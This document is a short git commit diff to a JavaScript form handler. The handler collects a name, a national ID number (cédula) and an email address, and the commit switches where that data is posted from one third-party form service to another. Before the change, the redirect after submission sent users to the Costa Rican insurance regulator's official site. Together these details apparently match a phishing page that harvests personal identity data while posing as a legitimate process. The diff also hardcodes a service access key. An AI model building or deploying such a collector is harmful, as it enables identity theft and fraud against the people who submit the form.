8c8eaaaeaac2a3ca56fdba839d6d5c0e5d8c6ea1
seguroforms <seguroforms@gmail.com>
2026-09-17 17:24:41 -0600

    Update data.js

--- data.js
+++ data.js
@@ -5,19 +5,20 @@
     e.preventDefault();
 
     const datos = {
+      access_key: "sf_164732b78635f1a7a01b1d24449986f6",
       nombre: document.getElementById('nombre').value.trim(),
       cedula: document.getElementById('cedula').value.trim(),
       email:  document.getElementById('email').value.trim()
     };
 
-    const response = await fetch('https://formspree.io/f/xjgjewjv', {
+    const response = await fetch('https://api.snapitforms.com/submit', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(datos)
     });
 
     if (response.ok) {
-      window.location.href = "https://www.sugese.fi.cr/SitePages/index.aspx";
+      window.location.href = "https://www.inter.edu/";
     } else {
       alert('❌ Hubo un error. Intenta de nuevo.');
     }
